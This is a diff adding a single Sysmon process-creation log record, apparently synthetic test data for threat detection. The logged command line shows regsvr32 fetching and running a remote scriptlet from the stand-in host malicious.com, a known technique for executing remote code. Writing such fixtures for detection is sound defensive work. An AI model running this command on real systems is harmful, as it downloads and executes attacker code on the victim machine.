@@ -1,0 +1,1 @@
+{"timestamp": "2026-02-03T12:00:00.000Z", "host": "WORKSTATION01", "channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1, "process": {"image": "C:\\Windows\\System32\\regsvr32.exe", "command_line": "regsvr32.exe /u /n /s /i:http://malicious.com/payload.sct scrobj.dll", "parent_image": "C:\\Windows\\System32\\cmd.exe"}, "user": {"name": "DOMAIN\\User"}}
